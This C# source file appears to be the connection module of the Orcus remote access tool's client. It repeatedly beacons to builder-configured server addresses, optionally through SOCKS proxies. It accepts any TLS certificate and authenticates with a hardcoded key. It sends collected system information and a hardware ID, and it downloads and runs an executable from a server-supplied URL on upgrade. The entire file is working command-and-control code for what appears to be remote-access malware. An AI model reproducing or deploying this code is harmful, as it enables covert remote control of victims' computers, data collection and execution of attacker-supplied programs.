using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;
using Orcus.Shared.Utilities;
using Orcus.Utilities;
using Starksoft.Aspen.Proxy;

namespace Orcus.Connection
{
    public class Client : IDisposable, IClientInfo
    {
        private readonly Random _random = new Random();
        private bool _isDisposed;

        public bool IsConnected { get; set; }
        public bool IsSearching { get; set; }
        public ServerConnection Connection { get; set; }

        IServerConnection IClientInfo.ServerConnection => Connection;
        IClientOperator IClientInfo.ClientOperator => ClientOperator.Instance;

        public void Dispose()
        {
            _isDisposed = true;
            IsSearching = false;
            Connection?.Dispose();
        }

        public event EventHandler Connected;
        public event EventHandler Disconnected;

        public void BeginConnect()
        {
            IsSearching = true;
            new Thread(Connect) {IsBackground = true}.Start();
        }

        public void StopConnect()
        {
            IsSearching = false;
        }

        private void Connect()
        {
#if DEBUG
            var ipAddresses = new List<IpAddressInfo>
            {
                new IpAddressInfo {Ip = "192.168.178.114", Port = 10134},
                new IpAddressInfo {Ip = "127.0.0.1", Port = 10134}
            };
#else
            var ipAddresses = Settings.GetBuilderProperty<ConnectionBuilderProperty>().IpAddresses;
#endif
            var currentIpIndex = 0;

            while (IsSearching)
            {
                var skip = false;

                foreach (var clientPlugin in PluginLoader.Current.ClientPlugins)
                {
                    try
                    {
                        if (!clientPlugin.CanTryConnect())
                        {
                            skip = true;
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ErrorReporter.Current.ReportError(ex, "CanStart() at plugin: \"" + clientPlugin.GetType() + "\"");
                    }
                }

                if (!skip)
                {
                    TcpClient client = null;
                    SslStream stream = null;
                    BinaryReader binaryReader = null;
                    BinaryWriter binaryWriter = null;

                    try
                    {
                        if (currentIpIndex >= ipAddresses.Count)
                            currentIpIndex = 0;

                        TryConnectDelegate connectFunction = TryConnect;
                        var connectionModifyingPlugin =
                            PluginLoader.Current.ClientPlugins.FirstOrDefault(x => x.OverwriteTryConnect);
                        if (connectionModifyingPlugin != null)
                            connectFunction = connectionModifyingPlugin.TryConnect;

                        if (connectFunction(out client, out stream, ipAddresses[currentIpIndex]))
                        {
                            currentIpIndex = 0;
                            binaryWriter = new BinaryWriter(stream);
                            binaryReader = new BinaryReader(stream);

                            string path;
                            if (!Initialize(binaryWriter, binaryReader, out path))
                            {
                                stream.Dispose();
                                client.Close();

                                if (path != null)
                                {
                                    Program.Unload();
                                    var exeName = Process.GetCurrentProcess().MainModule.FileName;
                                    var startInfo = new ProcessStartInfo(exeName)
                                    {
                                        Arguments = $"/wait /upgrade \"{path}\""
                                    };
                                    Process.Start(startInfo);
                                    Program.Exit();
                                }
                            }

                            if (Authenticate(binaryReader, binaryWriter))
                            {
                                InformationCollector.SendInformation(stream);
                                IsConnected = true;
                                StopConnect();
                                Connection = new ServerConnection(client, stream, binaryReader, binaryWriter,
                                    ClientOperator.Instance.DatabaseConnection, this);
                                Connection.Disconnected += Connection_Disconnected;
                                Connected?.Invoke(this, EventArgs.Empty);
                                break;
                            }
                        }
                        else
                            currentIpIndex ++;
                    }
                    catch (Exception)
                    {
                        // ignored
                    }

                    binaryReader?.Close();
                    binaryWriter?.Close();
                    stream?.Dispose();
                    client?.Close();
                }

                Thread.Sleep(Settings.GetBuilderProperty<ReconnectDelayProperty>().Delay + _random.Next(1, 340));
            }
        }

        private void Connection_Disconnected(object sender, EventArgs e)
        {
            if (!_isDisposed)
            {
                Disconnected?.Invoke(this, EventArgs.Empty);
                Thread.Sleep(Settings.GetBuilderProperty<ReconnectDelayProperty>().Delay + _random.Next(1, 340));
                BeginConnect();
            }
        }

        private bool Initialize(BinaryWriter binaryWriter, BinaryReader binaryReader, out string fileName)
        {
            fileName = null;
            binaryWriter.Write((byte) AuthentificationIntention.ClientRegister);
            binaryWriter.Write(Program.ServerApiVersion);
            switch ((PrimitiveProtocol) binaryReader.ReadByte())
            {
                case PrimitiveProtocol.ResponseEverythingIsAwesome:
                    return true;
                case PrimitiveProtocol.ResponseUpgradeNeeded:
                    var updateUrl = Encoding.UTF8.GetString(binaryReader.ReadBytes(binaryReader.ReadInt32()));
                    var path = FileExtensions.GetFreeTempFileName("exe");
                    using (var wc = new WebClient())
                    {
                        wc.DownloadFile(updateUrl, path);
                    }

                    fileName = path;
                    return false;
                default:
                    return false;
            }
        }

        private static bool TryConnect(out TcpClient tcpClient, out SslStream stream, IpAddressInfo ipAddressInfo)
        {
            tcpClient = null;
            stream = null;

            TcpClient client = null;
            try
            {
                var proxyProperty = Settings.GetBuilderProperty<ProxyBuilderProperty>();
                if (proxyProperty.ProxyOption != ProxyOption.None)
                {
                    if (proxyProperty.ProxyOption == ProxyOption.AutomaticDetection)
                    {
                        string ipAddress;
                        int port;
                        ProxyHelper.GetSystemProxy(out ipAddress, out port);
                        for (var i = 0; i < 3; i++)
                        {
                            try
                            {
                                IProxyClient proxyClient;
                                switch (i)
                                {
                                    case 0:
                                        proxyClient = new Socks4ProxyClient();
                                        break;

                                    case 1:
                                        proxyClient = new Socks4aProxyClient();
                                        break;

                                    case 2:
                                        proxyClient = new Socks5ProxyClient();
                                        break;
                                    default:
                                        throw new ArgumentException(); //impossible
                                }

                                proxyClient.ProxyHost = ipAddress;
                                proxyClient.ProxyPort = port;
                                client = proxyClient.CreateConnection(ipAddressInfo.Ip, ipAddressInfo.Port);
                                break;
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        }
                    }
                    else
                    {
                        IProxyClient proxyClient;
                        switch (proxyProperty.ProxyType)
                        {
                            case 0:
                                proxyClient = new Socks4ProxyClient();
                                break;
                            case 1:
                                proxyClient = new Socks4aProxyClient();
                                break;
                            case 2:
                                proxyClient = new Socks5ProxyClient();
                                break;
                            default:
                                throw new ArgumentException();
                        }

                        proxyClient.ProxyHost = proxyProperty.ProxyAddress;
                        proxyClient.ProxyPort = proxyProperty.ProxyPort;
                        client = proxyClient.CreateConnection(ipAddressInfo.Ip, ipAddressInfo.Port);
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            if (client == null)
            {
                client = new TcpClient();
                try
                {
                    var result = client.BeginConnect(ipAddressInfo.Ip, ipAddressInfo.Port, null, null);
                    var success = result.AsyncWaitHandle.WaitOne(3000, false);
                    if (!success)
                        return false;

                    client.EndConnect(result);
                }
                catch (Exception)
                {
                    return false;
                }
            }

            var sslStream = new SslStream(client.GetStream(), false, UserCertificateValidationCallback);

            try
            {
                var serverName = Environment.MachineName;
                sslStream.AuthenticateAsClient(serverName);
            }
            catch (AuthenticationException)
            {
                sslStream.Dispose();
                client.Close();
                return false;
            }

            tcpClient = client;
            stream = sslStream;
            return true;
        }

        private static bool UserCertificateValidationCallback(object sender, X509Certificate certificate,
            X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        internal bool Authenticate(BinaryReader binaryReader, BinaryWriter binaryWriter)
        {
            if (binaryReader.ReadByte() != (byte) AuthentificationFeedback.GetKey)
                return false;

            var keyIndex = binaryReader.ReadInt32();
            var keys = new KeyDatabase();
            binaryWriter.Write(keys.GetKey(keyIndex,
                "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh"));
            if (binaryReader.ReadByte() != (byte) AuthentificationFeedback.GetHardwareId)
                return false;
            binaryWriter.Write(InformationCollector.GetHardwareId());

            var result = binaryReader.ReadByte();
            if ((AuthentificationFeedback) result == AuthentificationFeedback.GetClientTag)
            {
                binaryWriter.Write(Settings.GetBuilderProperty<ClientTagBuilderProperty>().ClientTag);
                result = binaryReader.ReadByte();
            }

            return result == (byte) AuthentificationFeedback.Accepted;
        }

        private delegate bool TryConnectDelegate(
            out TcpClient tcpClient, out SslStream stream, IpAddressInfo ipAddressInfo);
    }
}